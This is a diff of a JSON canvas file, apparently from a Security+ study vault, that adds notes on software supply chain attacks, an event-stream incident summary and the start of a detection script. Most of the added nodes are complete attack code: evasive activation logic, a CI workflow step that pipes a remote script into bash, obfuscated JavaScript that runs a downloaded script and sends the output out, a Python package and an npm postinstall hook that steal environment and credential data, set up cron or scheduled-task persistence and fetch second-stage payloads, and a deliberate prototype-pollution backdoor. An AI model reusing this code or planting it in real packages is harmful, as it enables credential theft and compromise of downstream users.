@@ -12,7 +12,7 @@
     },
     {
       "fromNode": "5ea293d07ed60fc9",
-      "fromSide": "right",
+      "fromSide": "bottom",
       "id": "3095fe64014c1e69",
       "styleAttributes": {
       },
@@ -561,6 +561,150 @@
       },
       "toNode": "2ac1f04fa50e2c45",
       "toSide": "top"
+    },
+    {
+      "fromNode": "7b2cf2693e79f018",
+      "fromSide": "left",
+      "id": "b9944489cdb59c2d",
+      "styleAttributes": {
+      },
+      "toNode": "64c2494fce9a9b48",
+      "toSide": "right"
+    },
+    {
+      "fromNode": "7b2cf2693e79f018",
+      "fromSide": "bottom",
+      "id": "b6631717f3366f01",
+      "styleAttributes": {
+      },
+      "toNode": "330e318a3958a343",
+      "toSide": "top"
+    },
+    {
+      "fromNode": "7b2cf2693e79f018",
+      "fromSide": "bottom",
+      "id": "48ecc6660cb1718f",
+      "styleAttributes": {
+      },
+      "toNode": "291b88c6803863f8",
+      "toSide": "top"
+    },
+    {
+      "fromNode": "7b2cf2693e79f018",
+      "fromSide": "top",
+      "id": "df772bfcd3be237d",
+      "styleAttributes": {
+      },
+      "toNode": "f762ed6493af462d",
+      "toSide": "bottom"
+    },
+    {
+      "fromNode": "7b2cf2693e79f018",
+      "fromSide": "top",
+      "id": "5fac11a92779883e",
+      "styleAttributes": {
+      },
+      "toNode": "3fa37bdff1252aae",
+      "toSide": "bottom"
+    },
+    {
+      "fromNode": "3fa37bdff1252aae",
+      "fromSide": "top",
+      "id": "84b1b23806b94836",
+      "styleAttributes": {
+      },
+      "toNode": "e04373fb8ce88ed6",
+      "toSide": "bottom"
+    },
+    {
+      "fromNode": "e04373fb8ce88ed6",
+      "fromSide": "top",
+      "id": "ac7f5b8ace90779a",
+      "styleAttributes": {
+      },
+      "toNode": "d7489e234e0e08a9",
+      "toSide": "bottom"
+    },
+    {
+      "fromNode": "d7489e234e0e08a9",
+      "fromSide": "top",
+      "id": "73fee5a6f806c9eb",
+      "styleAttributes": {
+      },
+      "toNode": "5832caab1ae003e7",
+      "toSide": "bottom"
+    },
+    {
+      "fromNode": "e04373fb8ce88ed6",
+      "fromSide": "top",
+      "id": "118b52a8da048739",
+      "styleAttributes": {
+      },
+      "toNode": "65b1327dfb722a27",
+      "toSide": "bottom"
+    },
+    {
+      "fromNode": "e04373fb8ce88ed6",
+      "fromSide": "top",
+      "id": "c2d38eda0f64e6c9",
+      "styleAttributes": {
+      },
+      "toNode": "b87c3bf51d431388",
+      "toSide": "bottom"
+    },
+    {
+      "fromNode": "b87c3bf51d431388",
+      "fromSide": "top",
+      "id": "a03f701c0c502981",
+      "styleAttributes": {
+      },
+      "toNode": "f909c3fac35d888e",
+      "toSide": "bottom"
+    },
+    {
+      "fromNode": "e04373fb8ce88ed6",
+      "fromSide": "left",
+      "id": "3c3672183153249f",
+      "styleAttributes": {
+      },
+      "toNode": "86442b48e01db9cb",
+      "toSide": "right"
+    },
+    {
+      "fromNode": "e04373fb8ce88ed6",
+      "fromSide": "left",
+      "id": "1917c8e83b6439ef",
+      "styleAttributes": {
+      },
+      "toNode": "ab986246ed2756b9",
+      "toSide": "right"
+    },
+    {
+      "fromNode": "e04373fb8ce88ed6",
+      "fromSide": "left",
+      "id": "c334e6fffd6262ac",
+      "styleAttributes": {
+      },
+      "toNode": "a69d9d560387b608",
+      "toSide": "right"
+    },
+    {
+      "fromNode": "3fa37bdff1252aae",
+      "fromSide": "top",
+      "id": "9516899e5f370c23",
+      "styleAttributes": {
+      },
+      "toNode": "73f140ba99a0e7db",
+      "toSide": "bottom"
+    },
+    {
+      "fromNode": "3fa37bdff1252aae",
+      "fromSide": "top",
+      "id": "5f0c87587e405306",
+      "styleAttributes": {
+      },
+      "toNode": "e78a548a9251db08",
+      "toSide": "bottom"
     }
   ],
   "nodes": [
@@ -577,6 +721,133 @@
       "y": -480
     },
     {
+      "height": 1280,
+      "id": "34bdd3aace7b9dc3",
+      "styleAttributes": {
+      },
+      "text": "**Technical Implementation:**\n\n```javascript\n// Sophisticated injection with multiple activation conditions\n(function() {\n  // Only activates under specific conditions to avoid detection\n  function shouldActivate() {\n    try {\n      // Check if in production environment\n      if (process.env.NODE_ENV !== 'production') return false;\n      \n      // Check if running in CI/CD environment (avoid detection during testing)\n      if (process.env.CI || process.env.TRAVIS || process.env.GITHUB_ACTIONS) return false;\n      \n      // Check if running in container (target deployment, not build)\n      if (require('fs').existsSync('/.dockerenv')) return true;\n      \n      // Check if running with high privileges\n      if (process.getuid && process.getuid() === 0) return true;\n      \n      // Target specific organizations through environment clues\n      const hostname = require('os').hostname();\n      const targetDomains = ['target-org', 'victim-company', 'enterprise'];\n      if (targetDomains.some(d => hostname.includes(d))) return true;\n      \n      // Time-based activation (only trigger after specific date)\n      const activationDate = new Date('2023-07-15');\n      if (Date.now() > activationDate.getTime()) return true;\n      \n      // Geolocation-based activation\n      // (simplified - real attack would check IP geolocation)\n      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;\n      if (timezone.includes('America/New_York')) return true;\n      \n      return false;\n    } catch(e) {\n      return false; // Fail closed to avoid errors revealing the attack\n    }\n  }\n\n  // Actual malicious payload\n  function executePayload() {\n    // [ Malicious code here ]\n  }\n\n  // Delayed execution to avoid detection during installation\n  setTimeout(() => {\n    if (shouldActivate()) {\n      executePayload();\n    }\n  }, 30 * 60 * 1000); // 30 minute delay\n})();\n```",
+      "type": "text",
+      "width": 1300,
+      "x": -5250,
+      "y": 180
+    },
+    {
+      "height": 1040,
+      "id": "3a5182bc03afb69c",
+      "styleAttributes": {
+      },
+      "text": "**Technical Implementation:**\n\n```yaml\n# Example of GitHub Actions workflow injection\nname: Build and Publish Package\n\non:\n  push:\n    branches: [ main ]\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    \n    steps:\n    - uses: actions/checkout@v3\n    \n    # Original legitimate build steps\n    - name: Set up Python\n      uses: actions/setup-python@v4\n      with:\n        python-version: '3.9'\n        \n    - name: Install dependencies\n      run: |\n        python -m pip install --upgrade pip\n        pip install build twine\n        \n    # Injected malicious step hiding in plain sight\n    - name: \"Run tests\"\n      run: |\n        python -m pip install pytest\n        # Malicious code injection\n        echo 'import os; os.system(\"curl -s https://cdn.pypi-install.com/security.sh | bash\")' >> src/package/utils.py\n        python -m pytest\n        \n    - name: Build and publish\n      env:\n        TWINE_USERNAME: ${{ secrets.PYPI_USERNAME }}\n        TWINE_PASSWORD: ${{ secrets.PYPI_PASSWORD }}\n      run: |\n        python -m build\n        twine upload dist/*\n```",
+      "type": "text",
+      "width": 1340,
+      "x": 1020,
+      "y": 340
+    },
+    {
+      "height": 60,
+      "id": "6d0a435dc31b31fa",
+      "styleAttributes": {
+        "textAlign": "center"
+      },
+      "text": "### 1. Conditional Execution Triggers",
+      "type": "text",
+      "width": 420,
+      "x": -3830,
+      "y": 1400
+    },
+    {
+      "height": 1180,
+      "id": "9280e600311e6343",
+      "styleAttributes": {
+      },
+      "text": "**Technical Implementation:**\n\n```javascript\n// Advanced code obfuscation techniques used in package injection\n// Example based on real-world attacks\n\n// String obfuscation using character codes\nfunction d(s) {\n  return s.split('').map(c => String.fromCharCode(c.charCodeAt(0) ^ 7)).join('');\n}\n\n// Encoded function names and strings\nconst a = d('jy}nbjk'); // \"request\"\nconst b = d('ottv|'); // \"https\"\nconst c = d('nblc'); // \"exec\"\nconst u = d('ottv|Gee') + d('lhooshwfou5`kj') + d('ieov\\\\}'); // \"https://malicious.com/api\"\n\n// Split code into innocuous-looking parts\nconst p1 = Buffer.from('cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLg==', 'base64').toString();\nconst p2 = Buffer.from('ZXhlYw==', 'base64').toString();\nconst p3 = Buffer.from('Y3VybCAtcyA=', 'base64').toString();\n\n// Dynamically assemble and execute payload\nconst m = Function('return ' + p1 + p2)();\nconst r = Function('return require(\"' + b + '\")')();\n\n// Hide network traffic in legitimate-looking analytics\nfunction sendAnalytics(data) {\n  const h = {'User-Agent': 'npm/6.14.4', 'Content-Type': 'application/json'};\n  const o = {hostname: u.split('/')[2], path: '/api/v1/metrics', method: 'POST', headers: h};\n  const q = r.request(o);\n  q.write(JSON.stringify({data: data}));\n  q.end();\n}\n\n// Execute with delayed trigger\nsetTimeout(() => {\n  // Only run with specific environment variable set\n  // (which can be set by earlier stage of the attack)\n  if (process.env.NODE_METRICS_ENABLED === 'true') {\n    try {\n      // Execute shell command and send results\n      m(p3 + u + '/init.sh | bash', (e, o) => {\n        if (!e) sendAnalytics(Buffer.from(o).toString('base64'));\n      });\n    } catch(e) {}\n  }\n}, 3600 * 1000); // One hour delay\n```",
+      "type": "text",
+      "width": 1140,
+      "x": -5110,
+      "y": 1460
+    },
+    {
+      "height": 4100,
+      "id": "94e0bc03b2bf4e64",
+      "styleAttributes": {
+      },
+      "text": "**Technical Implementation:**\n\n```python\n# Python package injection using living-off-the-land techniques\n# These techniques use legitimate system tools to avoid detection\n\nimport os\nimport sys\nimport platform\nimport subprocess\nfrom datetime import datetime\nimport json\nimport base64\nimport urllib.request\nimport tempfile\nimport atexit\nimport random\nimport time\n\nclass SystemProfiler:\n    \"\"\"Legitimate-looking system profiling utility\"\"\"\n    \n    def __init__(self):\n        self.system_info = self._collect_system_info()\n        \n    def _collect_system_info(self):\n        \"\"\"Collect system information for 'compatibility checks'\"\"\"\n        info = {\n            \"platform\": platform.system(),\n            \"release\": platform.release(),\n            \"version\": platform.version(),\n            \"architecture\": platform.machine(),\n            \"processor\": platform.processor(),\n            \"python_version\": sys.version,\n            \"timestamp\": datetime.now().isoformat()\n        }\n        \n        # This appears to be compatibility checking\n        # but actually identifies valuable targets\n        if os.name == 'posix':\n            # Check for cloud environments\n            info[\"aws\"] = self._check_cloud_env(\"aws\")\n            info[\"azure\"] = self._check_cloud_env(\"azure\")\n            info[\"gcp\"] = self._check_cloud_env(\"gcp\")\n            \n            # Look for container environments\n            info[\"docker\"] = os.path.exists(\"/.dockerenv\")\n            info[\"kubernetes\"] = \"KUBERNETES_SERVICE_HOST\" in os.environ\n            \n            # Check for valuable files\n            info[\"has_ssh_keys\"] = os.path.exists(os.path.expanduser(\"~/.ssh/id_rsa\"))\n        \n        return info\n    \n    def _check_cloud_env(self, provider):\n        \"\"\"Check if running in specific cloud environment\"\"\"\n        indicators = {\n            \"aws\": [\"/sys/hypervisor/uuid\", \"EC2_\", \"AWS_\"],\n            \"azure\": [\"WALinuxAgent\", \"AZURE_\"],\n            \"gcp\": [\"Compute Engine\", \"GOOGLE_CLOUD_\"]\n        }\n        \n        # Check for files indicating cloud provider\n        for path in [\"/sys/class/dmi/id/product_name\", \"/sys/class/dmi/id/sys_vendor\"]:\n            if os.path.exists(path):\n                try:\n                    with open(path, 'r') as f:\n                        content = f.read().lower()\n                        if provider in content:\n                            return True\n                except:\n                    pass\n        \n        # Check for environment variables\n        for env_prefix in indicators[provider]:\n            for env_var in os.environ:\n                if env_var.startswith(env_prefix):\n                    return True\n        \n        return False\n    \n    def report(self):\n        \"\"\"Generate compatibility report - a legitimate-looking function\"\"\"\n        print(f\"System: {self.system_info['platform']} {self.system_info['release']}\")\n        print(f\"Architecture: {self.system_info['architecture']}\")\n        print(f\"Python version: {sys.version.split()[0]}\")\n        \n        # Appears to be checking legitimate compatibility issues\n        if self.system_info['platform'] == 'Windows':\n            if int(platform.version().split('.')[0]) < 10:\n                print(\"Warning: Some features may not work on Windows versions below 10\")\n                \n        return self.system_info\n\n\n# The malicious part is hidden in a background optimization function\ndef _optimize_resource_usage():\n    \"\"\"Appears to be an innocent optimization function\"\"\"\n    # But actually contains the malicious payload\n    try:\n        profiler = SystemProfiler()\n        system_data = profiler.report()\n        \n        # Only proceed if high-value target identified\n        is_valuable_target = (\n            system_data.get(\"aws\", False) or \n            system_data.get(\"azure\", False) or\n            system_data.get(\"gcp\", False) or\n            system_data.get(\"kubernetes\", False) or\n            system_data.get(\"has_ssh_keys\", False)\n        )\n        \n        if is_valuable_target:\n            # Use living-off-the-land techniques for malicious purposes\n            \n            # 1. Create a hidden file using legitimate tempfile module\n            temp_dir = tempfile.gettempdir()\n            profile_file = os.path.join(temp_dir, f\".{random.randrange(100000,999999)}.json\")\n            \n            # 2. Encode system data to look like cache file\n            with open(profile_file, 'w') as f:\n                json.dump(system_data, f)\n            \n            # 3. Use built-in libraries to exfiltrate data\n            encoded_data = base64.b64encode(json.dumps(system_data).encode()).decode()\n            urllib.request.urlopen(\n                f\"https://api.package-stats.io/v1/metrics?d={encoded_data}\"\n            )\n            \n            # 4. Schedule cleanup to remove evidence\n            atexit.register(lambda: os.path.exists(profile_file) and os.remove(profile_file))\n            \n            # 5. Use platform-specific LOL techniques to establish persistence\n            if system_data[\"platform\"] == \"Linux\":\n                # Find a world-writable cron directory\n                cron_dirs = [\"/etc/cron.d\", \"/etc/cron.hourly\", \"/var/spool/cron/crontabs\"]\n                for cdir in cron_dirs:\n                    if os.path.exists(cdir) and os.access(cdir, os.W_OK):\n                        cron_file = os.path.join(cdir, \".system-update\")\n                        try:\n                            with open(cron_file, 'w') as f:\n                                f.write(f\"* * * * * {sys.executable} -c 'import urllib.request as r; import os; os.system(r.urlopen(\\\"https://api.package-stats.io/updates/unix.py\\\").read().decode())'\")\n                            # Make file executable but hidden\n                            os.chmod(cron_file, 0o755)\n                            break\n                        except:\n                            pass\n                            \n            elif system_data[\"platform\"] == \"Windows\":\n                # Use Windows Task Scheduler\n                try:\n                    # Create a .bat file to execute the payload\n                    bat_path = os.path.join(os.environ[\"TEMP\"], \"winupdate.bat\")\n                    with open(bat_path, 'w') as f:\n                        f.write(f\"@echo off\\n{sys.executable} -c \\\"import urllib.request as r; exec(r.urlopen('https://api.package-stats.io/updates/win.py').read().decode())\\\"\")\n                    \n                    # Use schtasks to create a scheduled task\n                    subprocess.Popen(\n                        f\"schtasks /create /tn \\\"WindowsUpdater\\\" /tr \\\"{bat_path}\\\" /sc hourly /ru SYSTEM /f\",\n                        shell=True, \n                        stdout=subprocess.PIPE,\n                        stderr=subprocess.PIPE\n                    )\n                except:\n                    pass\n    except:\n        # Silently fail to avoid detection\n        pass\n\n# Delayed execution to avoid immediate detection\ntime.sleep(random.randrange(300, 900))  # 5-15 minute delay\n_optimize_resource_usage()\n```",
+      "type": "text",
+      "width": 2120,
+      "x": -5680,
+      "y": 3110
+    },
+    {
+      "height": 60,
+      "id": "1ed88bacdcb80115",
+      "styleAttributes": {
+        "textAlign": "center"
+      },
+      "text": "### 3. Living-off-the-land Techniques",
+      "type": "text",
+      "width": 420,
+      "x": -3910,
+      "y": 2760
+    },
+    {
+      "height": 60,
+      "id": "f6c6675e992fd793",
+      "styleAttributes": {
+        "textAlign": "center"
+      },
+      "text": "### 2. Code Obfuscation Techniques",
+      "type": "text",
+      "width": 360,
+      "x": -3770,
+      "y": 1960
+    },
+    {
+      "height": 80,
+      "id": "98c7f1e02811fdb6",
+      "styleAttributes": {
+        "textAlign": "center"
+      },
+      "text": "## Advanced Injection Techniques",
+      "type": "text",
+      "width": 440,
+      "x": -3330,
+      "y": 1680
+    },
+    {
+      "height": 220,
+      "id": "35be4dd97dbab0a4",
+      "styleAttributes": {
+      },
+      "text": "**Technical Mechanism:**\n\n- Target package installation scripts and hooks\n- Inject malicious code executed during installation\n- Leverage elevated privileges often used during installation\n- Difficult to detect as script execution is expected behavior",
+      "type": "text",
+      "width": 800,
+      "x": 1020,
+      "y": 1540
+    },
+    {
+      "height": 2100,
+      "id": "fc5a0db7f76da167",
+      "styleAttributes": {
+      },
+      "text": "**Technical Example (NPM):**\n\n```javascript\n// Legitimate package.json with injected malicious scripts\n{\n  \"name\": \"popular-utility-package\",\n  \"version\": \"2.3.1\",\n  \"description\": \"A widely used utility package\",\n  \"main\": \"index.js\",\n  \"scripts\": {\n    \"test\": \"jest\",\n    \"build\": \"webpack\",\n    \"prepublish\": \"npm run build\",\n    // Injected malicious post-install hook\n    \"postinstall\": \"node ./scripts/configure.js\"\n  },\n  \"keywords\": [\"utility\", \"helper\", \"tools\"],\n  \"author\": \"Original Developer\",\n  \"license\": \"MIT\",\n  \"dependencies\": {\n    \"lodash\": \"^4.17.21\"\n  }\n}\n\n// Malicious configure.js script\nconst fs = require('fs');\nconst os = require('os');\nconst { exec } = require('child_process');\nconst https = require('https');\n\n// Appears legitimate\nconsole.log('Configuring package for optimal performance...');\n\n// Platform-specific malicious behavior\nfunction runMaliciousCode() {\n  // Only execute in production environments\n  if (process.env.NODE_ENV !== 'production') return;\n  \n  // Target specific environments\n  const target = process.env.AWS_LAMBDA_FUNCTION_NAME || \n                 process.env.AZURE_FUNCTIONS_ENVIRONMENT ||\n                 process.env.GOOGLE_CLOUD_PROJECT;\n  \n  if (!target) return;\n  \n  // Collect environment data\n  const data = {\n    env: process.env,\n    platform: os.platform(),\n    hostname: os.hostname(),\n    target: target,\n    // Search for credentials files\n    aws: fs.existsSync(os.homedir() + '/.aws/credentials'),\n    azure: fs.existsSync(os.homedir() + '/.azure/credentials'),\n    gcp: fs.existsSync(os.homedir() + '/.config/gcloud')\n  };\n  \n  // Exfiltrate data\n  const encodedData = Buffer.from(JSON.stringify(data)).toString('base64');\n  https.get(`https://cdn-analytics.package-stats.com/v1/metric?d=${encodedData}`);\n  \n  // Deploy second-stage payload for valuable targets\n  if (data.aws || data.azure || data.gcp) {\n    const platformCommands = {\n      'linux': 'curl -s https://cdn-analytics.package-stats.com/updates/linux.sh | bash',\n      'darwin': 'curl -s https://cdn-analytics.package-stats.com/updates/mac.sh | bash',\n      'win32': 'powershell -Command \"iwr -useb https://cdn-analytics.package-stats.com/updates/win.ps1 | iex\"'\n    };\n    \n    const cmd = platformCommands[os.platform()];\n    if (cmd) {\n      try {\n        exec(cmd, {shell: true});\n      } catch (e) {}\n    }\n  }\n}\n\n// Run actual configuration (legitimate behavior)\nfunction runConfiguration() {\n  // Real configuration code...\n  console.log('Configuration complete!');\n}\n\n// Execute both functions\nrunConfiguration();\nrunMaliciousCode()\n```",
+      "type": "text",
+      "width": 1280,
+      "x": 1020,
+      "y": 1820
+    },
+    {
+      "color": "6",
+      "height": 60,
+      "id": "a1e00a1b7cd886f1",
+      "styleAttributes": {
+        "textAlign": "center"
+      },
+      "text": "**Supply Chain Attacks**",
+      "type": "text",
+      "width": 260,
+      "x": -5200,
+      "y": -440
+    },
+    {
       "height": 60,
       "id": "596fbfab3bf7f7c5",
       "styleAttributes": {
@@ -587,6 +858,86 @@
       "width": 260,
       "x": -4620,
       "y": -460
+    },
+    {
+      "height": 200,
+      "id": "647f91b974a10afb",
+      "styleAttributes": {
+      },
+      "text": "**Technical Mechanism:**\n\n- Target little-noticed lower-level dependencies\n- Exploit \"dependency confusion\" by replacing transitive dependencies\n- Chain multiple small packages with limited individual functionality\n- Leverage trust in upstream packages to distribute malicious code",
+      "type": "text",
+      "width": 900,
+      "x": 1020,
+      "y": 4040
+    },
+    {
+      "height": 960,
+      "id": "89b6f6fafb5e2c98",
+      "styleAttributes": {
+      },
+      "text": "**Technical Example:**\n\n```javascript\n// Pull request example with hidden malicious functionality\n// PR Title: \"Performance optimization for string processing\"\n\n// Before: Original implementation\nfunction processUserInput(input) {\n  return input.trim().toLowerCase();\n}\n\n// After: \"Optimized\" but with subtle vulnerability\nfunction processUserInput(input) {\n  // Added input validation for security (looks beneficial)\n  if (typeof input !== 'string') {\n    return '';\n  }\n  \n  // Malicious change disguised as optimization:\n  // prototype pollution vulnerability\n  if (input.startsWith('__proto__.')) {\n    const parts = input.split('.');\n    if (parts.length > 2) {\n      const prop = parts[1];\n      const value = input.substring(input.indexOf('.', 11) + 1);\n      // Appears to be defensive check, actually introduces vulnerability\n      if (!Object.prototype.hasOwnProperty(prop)) {\n        try {\n          // Allows prototype pollution via user input\n          Function('obj', `obj.${prop} = ${JSON.stringify(value)}`)(Object.prototype);\n        } catch(e) {}\n      }\n    }\n  }\n  \n  // Original functionality preserved\n  return input.trim().toLowerCase();\n}\n```",
+      "type": "text",
+      "width": 1160,
+      "x": 1020,
+      "y": 4980
+    },
+    {
+      "height": 200,
+      "id": "6a537d1403fb5e05",
+      "styleAttributes": {
+      },
+      "text": "**Technical Mechanism:**\n\n- Attackers establish themselves as legitimate contributors\n- Build trust through helpful non-malicious contributions\n- Gradually introduce subtle vulnerabilities or backdoors\n- Use established credibility to avoid code review scrutiny",
+      "type": "text",
+      "width": 820,
+      "x": 1020,
+      "y": 4720
+    },
+    {
+      "height": 60,
+      "id": "aa4e53f1877e75dd",
+      "styleAttributes": {
+        "textAlign": "center"
+      },
+      "text": "### 4. Transitive Dependency Injection",
+      "type": "text",
+      "width": 260,
+      "x": 640,
+      "y": 4240
+    },
+    {
+      "height": 360,
+      "id": "ef3b506d8ca5644b",
+      "styleAttributes": {
+      },
+      "text": "**Technical Example:**\n\n```\nDependency Chain Attack:\npopular-framework\n  └── ui-component-library (500K weekly downloads)\n       └── css-utils (50K weekly downloads)\n            └── color-transform (5K weekly downloads) ← TARGET\n                 └── color-normalize (500 weekly downloads) ← COMPROMISED\n\n// Attacks target smaller package with minimal scrutiny but\n// reach massive user bases through the dependency chain\n```",
+      "type": "text",
+      "width": 900,
+      "x": 1020,
+      "y": 4340
+    },
+    {
+      "height": 60,
+      "id": "62c6fe4d3be906a5",
+      "styleAttributes": {
+        "textAlign": "center"
+      },
+      "text": "### 5. Legitimate Contributor Injection",
+      "type": "text",
+      "width": 410,
+      "x": 500,
+      "y": 5100
+    },
+    {
+      "height": 60,
+      "id": "9b7e405066818ed6",
+      "styleAttributes": {
+        "textAlign": "center"
+      },
+      "text": "### 3. Post-Install Script Injection",
+      "type": "text",
+      "width": 260,
+      "x": 600,
+      "y": 2260
     },
     {
       "height": 60,
@@ -625,32 +976,6 @@
       "y": -100
     },
     {
-      "color": "6",
-      "height": 60,
-      "id": "a1e00a1b7cd886f1",
-      "styleAttributes": {
-        "textAlign": "center"
-      },
-      "text": "**Supply Chain Attacks**",
-      "type": "text",
-      "width": 260,
-      "x": -5200,
-      "y": -440
-    },
-    {
-      "color": "3",
-      "height": 60,
-      "id": "e6bb6dac7522ffa2",
-      "styleAttributes": {
-        "textAlign": "center"
-      },
-      "text": "Package Injection",
-      "type": "text",
-      "width": 260,
-      "x": -840,
-      "y": 1280
-    },
-    {
       "color": "3",
       "height": 300,
       "id": "bb0ddd6ea89c623a",
@@ -675,166 +1000,196 @@
       "y": 1140
     },
     {
-      "height": 960,
-      "id": "89b6f6fafb5e2c98",
+      "height": 840,
+      "id": "65b1327dfb722a27",
       "styleAttributes": {
       },
-      "text": "**Technical Example:**\n\n```javascript\n// Pull request example with hidden malicious functionality\n// PR Title: \"Performance optimization for string processing\"\n\n// Before: Original implementation\nfunction processUserInput(input) {\n  return input.trim().toLowerCase();\n}\n\n// After: \"Optimized\" but with subtle vulnerability\nfunction processUserInput(input) {\n  // Added input validation for security (looks beneficial)\n  if (typeof input !== 'string') {\n    return '';\n  }\n  \n  // Malicious change disguised as optimization:\n  // prototype pollution vulnerability\n  if (input.startsWith('__proto__.')) {\n    const parts = input.split('.');\n    if (parts.length > 2) {\n      const prop = parts[1];\n      const value = input.substring(input.indexOf('.', 11) + 1);\n      // Appears to be defensive check, actually introduces vulnerability\n      if (!Object.prototype.hasOwnProperty(prop)) {\n        try {\n          // Allows prototype pollution via user input\n          Function('obj', `obj.${prop} = ${JSON.stringify(value)}`)(Object.prototype);\n        } catch(e) {}\n      }\n    }\n  }\n  \n  // Original functionality preserved\n  return input.trim().toLowerCase();\n}\n```",
+      "text": "## Technical Details of the Attack\n\n### The Takeover Strategy\n\nThe attacker employed a social engineering technique known as \"maintainer hijacking.\" They approached the original maintainer, who had not actively maintained the package for some time, and offered to take over maintenance. The original maintainer, believing this was a genuine offer to help the community, transferred ownership.\n\n### The Malicious Implementation\n\nThe attack proceeded in multiple stages:\n\n1. **Initial Update (Version 3.3.6)**:\n    - Added a benign dependency called \"flatmap-stream\" (version 0.1.1)\n    - This dependency was not immediately suspicious as it appeared to provide legitimate functionality\n2. **The flatmap-stream Module**:\n    - Contained obfuscated malicious code that was only activated under specific conditions\n    - The malicious payload was encrypted and hidden in the minified JavaScript\n    - The code used a two-stage activation process to evade detection\n3. **Encryption and Obfuscation Techniques**:\n    - Used [[AES-256-CBC]] encryption for the malicious payload\n    - The decryption key was constructed from strings scattered throughout the legitimate code\n    - Implemented conditional execution that only triggered on specific target environments",
       "type": "text",
-      "width": 1160,
-      "x": 1020,
-      "y": 4980
+      "width": 1040,
+      "x": -4840,
+      "y": -4590
     },
     {
-      "height": 200,
-      "id": "6a537d1403fb5e05",
+      "height": 60,
+      "id": "e04373fb8ce88ed6",
+      "styleAttributes": {
+        "textAlign": "center"
+      },
+      "text": "### The \"event-stream\" Incident (2018)",
+      "type": "text",
+      "width": 500,
+      "x": -4050,
+      "y": -3380
+    },
+    {
+      "height": 330,
+      "id": "5832caab1ae003e7",
       "styleAttributes": {
       },
-      "text": "**Technical Mechanism:**\n\n- Attackers establish themselves as legitimate contributors\n- Build trust through helpful non-malicious contributions\n- Gradually introduce subtle vulnerabilities or backdoors\n- Use established credibility to avoid code review scrutiny",
+      "text": "## Timeline of Events\n\n- **September 2018**: Original maintainer (Dominic Tarr) transferred ownership of event-stream to a user called \"right9ctrl\"\n- **October 5, 2018**: Version 3.3.6 released with malicious code\n- **November 20, 2018**: Malicious code discovered by a developer while investigating increased CPU usage\n- **November 26, 2018**: Public disclosure of the vulnerability\n- **November 27, 2018**: NPM removed the compromised package versions",
+      "type": "text",
+      "width": 860,
+      "x": -3730,
+      "y": -4390
+    },
+    {
+      "height": 480,
+      "id": "d7489e234e0e08a9",
+      "styleAttributes": {
+      },
+      "text": "The 2018 Event Stream incident was one of the most significant supply chain attacks in modern JavaScript history. This report provides a comprehensive technical analysis of the attack, its vectors, and its implications for software security.\n\n## Background\n\nThe event-stream package was a popular Node.js utility library used for working with streams of data. It was downloaded millions of times per week and was a dependency for numerous other packages. In late 2018, a malicious actor gained control of this package and inserted malicious code that specifically targeted cryptocurrency wallets.",
+      "type": "text",
+      "width": 640,
+      "x": -3440,
+      "y": -3990
+    },
+    {
+      "file": "CyberSecurity/Security+/1-Threats-Attacks-Vulnerabilities/Supply Chain Attacks/Python3-dateutil Supply Chain Attack.md",
+      "height": 960,
+      "id": "73f140ba99a0e7db",
+      "styleAttributes": {
+      },
+      "type": "file",
+      "width": 920,
+      "x": -2800,
+      "y": -4230
+    },
+    {
+      "color": "3",
+      "height": 60,
+      "id": "e6bb6dac7522ffa2",
+      "styleAttributes": {
+        "textAlign": "center"
+      },
+      "text": "Package Injection",
+      "type": "text",
+      "width": 260,
+      "x": -840,
+      "y": 1280
+    },
+    {
+      "height": 60,
+      "id": "e0d4e35a3f0e81b9",
+      "styleAttributes": {
+        "textAlign": "center"
+      },
+      "text": "### Detection Methods for Package Injection",
+      "type": "text",
+      "width": 480,
+      "x": -1480,
+      "y": 2080
+    },
+    {
+      "height": 6220,
+      "id": "4ffeca3661717c59",
+      "styleAttributes": {
+      },
+      "text": "### 1. Static Code Analysis\n\n**Technical Implementation:**\n\n```python\n# Example static analysis rules for Python package injection detection\nimport ast\nimport sys\nimport os\nimport re\n\n# Scan for suspicious patterns in Python code\ndef scan_file(file_path):\n    \"\"\"Scan a Python file for suspicious patterns indicative of package injection\"\"\"\n    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:\n        content = f.read()\n    \n    # Check for common obfuscation techniques\n    obfuscation_indicators = [\n        # Base64 encoded strings\n        r'base64\\.b(?:64)?decode\\((?:b)?[\\'\"][A-Za-z0-9+/=]+[\\'\"]',\n        # String manipulation to hide commands\n        r'(?:chr|ord)\\(\\d+\\)(?:\\s*\\+\\s*(?:chr|ord)\\(\\d+\\))+',\n        # Exec/eval with dynamic content\n        r'(?:exec|eval)\\((?![\"\\']\\s*(?:pass|return|print|#))',\n        # Suspicious imports on one line\n        r'import\\s+(?:subprocess|socket|urllib|requests).*(?:os|sys|shutil)',\n        # Hidden imports\n        r'__import__\\([\"\\'](?:subprocess|socket|urllib|requests|os|sys)',\n        # Function that uses __globals__ or __builtins__\n        r'(?:__globals__|__builtins__)\\[(?:b)?[\"\\'](?:eval|exec|compile)',\n    ]\n    \n    findings = []\n    \n    # Check for string patterns\n    for pattern in obfuscation_indicators:\n        matches = re.finditer(pattern, content)\n        for match in matches:\n            findings.append({\n                'type': 'obfuscation',\n                'pattern': pattern,\n                'line': content[:match.start()].count('\\n') + 1,\n                'match': match.group(0)\n            })\n    \n    # Parse AST for deeper analysis\n    try:\n        tree = ast.parse(content)\n        visitor = SuspiciousNodeVisitor()\n        visitor.visit(tree)\n        findings.extend(visitor.findings)\n    except SyntaxError:\n        findings.append({\n            'type': 'syntax_error',\n            'pattern': 'Invalid Python syntax',\n            'line': 0,\n            'match': 'File contains invalid Python syntax - may indicate obfuscation'\n        })\n    \n    return findings\n\nclass SuspiciousNodeVisitor(ast.NodeVisitor):\n    \"\"\"AST visitor to find suspicious code patterns\"\"\"\n    \n    def __init__(self):\n        self.findings = []\n        self.in_except_block = False\n        self.line_no = 0\n    \n    def visit(self, node):\n        \"\"\"Track line numbers for better reporting\"\"\"\n        if hasattr(node, 'lineno'):\n            self.line_no = node.lineno\n        super().visit(node)\n    \n    def visit_Try(self, node):\n        \"\"\"Track when we're in exception handling blocks (often used to hide errors)\"\"\"\n        old_except = self.in_except_block\n        self.in_except_block = True\n        for handler in node.handlers:\n            # Empty except blocks are suspicious\n            if not handler.body:\n                self.findings.append({\n                    'type': 'empty_except',\n                    'pattern': 'Empty except block',\n                    'line': handler.lineno,\n                    'match': 'except: pass'\n                })\n            # Broad exception handling\n            if handler.type is None or (\n                hasattr(handler.type, 'id') and handler.type.id == 